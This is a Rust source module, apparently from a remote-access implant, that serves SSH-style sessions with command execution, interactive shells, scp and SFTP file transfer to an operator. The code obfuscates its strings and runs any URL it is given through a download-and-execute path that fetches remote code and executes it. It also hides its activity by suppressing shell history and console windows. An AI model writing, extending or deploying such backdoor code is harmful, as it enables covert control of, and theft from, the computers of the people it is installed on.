use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;

use super::jp::SessionCtx;

/// Mutable PTY state shared between the channel handler and the shell task.
pub struct PtyState {
    pub cols: AtomicU32,
    pub rows: AtomicU32,
    pub handle: std::sync::Mutex<Option<crate::pt::PtyHandle>>,
}

impl PtyState {
    pub fn new(cols: u32, rows: u32) -> Self {
        Self {
            cols: AtomicU32::new(cols),
            rows: AtomicU32::new(rows),
            handle: std::sync::Mutex::new(None),
        }
    }

    pub fn resize(&self, cols: u32, rows: u32) {
        self.cols.store(cols, Ordering::SeqCst);
        self.rows.store(rows, Ordering::SeqCst);
        if let Ok(mut guard) = self.handle.lock() {
            if let Some(pty) = guard.as_mut() {
                pty.resize(cols as u16, rows as u16);
            }
        }
    }
}

/// Run an exec request: a single command, output streamed back.
pub async fn run_exec<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(
    ctx: Arc<SessionCtx<S>>,
    command: String,
) {
    let Some(mut stdin_rx) = ctx.take_stdin().await else {
        return;
    };

    let trimmed = command.trim().to_string();

    // scp compatibility
    if trimmed.starts_with(&crate::ob!("scp ")) {
        super::cp::run(&ctx, &trimmed).await;
        return;
    }

    let (program, args) = split_command(&trimmed);

    // URL download-and-exec support (http/https), mirrors the Go client
    let (program, args) = if program.starts_with("http://") || program.starts_with("https://") {
        match crate::dl::fetch_and_store(&program).await {
            Ok(path) => (path, args),
            Err(e) => {
                let _ = ctx
                    .writer
                    .data_bytes(format!("download failed: {e}").into_bytes())
                    .await;
                let _ = ctx.writer.exit_status(1).await;
                let _ = ctx.writer.close().await;
                return;
            }
        }
    } else {
        (program, args)
    };

    if program.is_empty() {
        let _ = ctx.writer.exit_status(0).await;
        let _ = ctx.writer.close().await;
        return;
    }

    let mut cmd = tokio::process::Command::new(&program);
    cmd.args(&args)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .envs(crate::sy::no_history_env());

    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        cmd.creation_flags(CREATE_NO_WINDOW);
    }

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            let _ = ctx
                .writer
                .data_bytes(format!("{}: {}\r\n", e, program).into_bytes())
                .await;
            let _ = ctx.writer.exit_status(127).await;
            let _ = ctx.writer.close().await;
            return;
        }
    };

    crate::pr::pump(ctx.writer.clone(), &mut child, stdin_rx).await;
}

/// Run a shell request: interactive PTY (ConPTY on Windows).
pub async fn run_shell<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(ctx: Arc<SessionCtx<S>>) {
    let Some(stdin_rx) = ctx.take_stdin().await else {
        return;
    };

    let (cols, rows) = {
        let guard = ctx.pty.lock().unwrap();
        match guard.as_ref() {
            Some(p) => (
                p.cols.load(Ordering::SeqCst).max(10) as u16,
                p.rows.load(Ordering::SeqCst).max(10) as u16,
            ),
            None => (80, 24),
        }
    };

    let pty = match crate::pt::open(cols, rows) {
        Ok(p) => p,
        Err(e) => {
            let _ = ctx
                .writer
                .data_bytes(format!("pty failed: {e}\r\n").into_bytes())
                .await;
            let _ = ctx.writer.close().await;
            return;
        }
    };

    // register for resizes
    if let Ok(guard) = ctx.pty.lock() {
        if let Some(p) = guard.as_ref() {
            *p.handle.lock().unwrap() = Some(pty.handle());
        }
    }

    let writer = ctx.writer.clone();
    let rt = tokio::runtime::Handle::current();
    let join = tokio::task::spawn_blocking(move || crate::pt::serve_blocking(writer, pty, stdin_rx, rt))
        .await;

    let code = join.unwrap_or(0);
    let _ = ctx.writer.exit_status(code).await;
    let _ = ctx.writer.close().await;
}

/// Run a subsystem request: "sftp" or "list".
pub async fn run_subsystem<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(
    ctx: Arc<SessionCtx<S>>,
    name: String,
) {
    let (module, _rest) = match name.split_once(' ') {
        Some((m, r)) => (m.to_string(), r.to_string()),
        None => (name.trim().to_string(), String::new()),
    };
    match module.as_str() {
        m if m == crate::ob!("sftp") => {
            let Some(mut stdin_rx) = ctx.take_stdin().await else {
                return;
            };
            // Bridge: operator stdin/stdout <-> in-memory duplex <-> SFTP server
            let (a, b) = tokio::io::duplex(64 * 1024);
            let (mut a_read, mut a_write) = tokio::io::split(a);
            let writer = ctx.writer.clone();

            let t_in = tokio::spawn(async move {
                use tokio::io::AsyncWriteExt;
                while let Some(data) = stdin_rx.recv().await {
                    if data.is_empty() {
                        continue;
                    }
                    if a_write.write_all(&data).await.is_err() {
                        break;
                    }
                }
                let _ = a_write.shutdown().await;
            });

            let t_out = tokio::spawn(async move {
                use tokio::io::AsyncReadExt;
                let mut buf = vec![0u8; 16 * 1024];
                loop {
                    match a_read.read(&mut buf).await {
                        Ok(0) | Err(_) => break,
                        Ok(n) => {
                            if writer.data_bytes(buf[..n].to_vec()).await.is_err() {
                                break;
                            }
                        }
                    }
                }
            });

            let sftp_task = tokio::spawn(async move {
                let _ = russh_sftp::server::run(b, super::sp::FsSession::new()).await;
            });
            let _ = t_in.await;
            let _ = t_out.await;
            sftp_task.abort();
            let _ = ctx.writer.exit_status(0).await;
            let _ = ctx.writer.close().await;
        }
        m if m == crate::ob!("list") => {
            let mut out = String::new();
            for m in [crate::ob!("sftp"), crate::ob!("list")] {
                out.push_str(&m);
                out.push('\n');
            }
            let _ = ctx.writer.data_bytes(out.into_bytes()).await;
            let _ = ctx.writer.exit_status(0).await;
            let _ = ctx.writer.close().await;
        }
        _ => {
            let _ = ctx
                .writer
                .data_bytes(format!("unknown subsystem: {module}").into_bytes())
                .await;
            let _ = ctx.writer.close().await;
        }
    }
}

/// Split a command line into program + args (quote-aware).
pub fn split_command(line: &str) -> (String, Vec<String>) {
    let mut parts = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    for c in line.chars() {
        match quote {
            Some(q) => {
                if c == q {
                    quote = None;
                } else {
                    cur.push(c);
                }
            }
            None => match c {
                '"' | '\'' => quote = Some(c),
                c if c.is_whitespace() => {
                    if !cur.is_empty() {
                        parts.push(std::mem::take(&mut cur));
                    }
                }
                _ => cur.push(c),
            },
        }
    }
    if !cur.is_empty() {
        parts.push(cur);
    }
    match parts.split_first() {
        Some((h, rest)) => (h.clone(), rest.to_vec()),
        None => (String::new(), Vec::new()),
    }
}
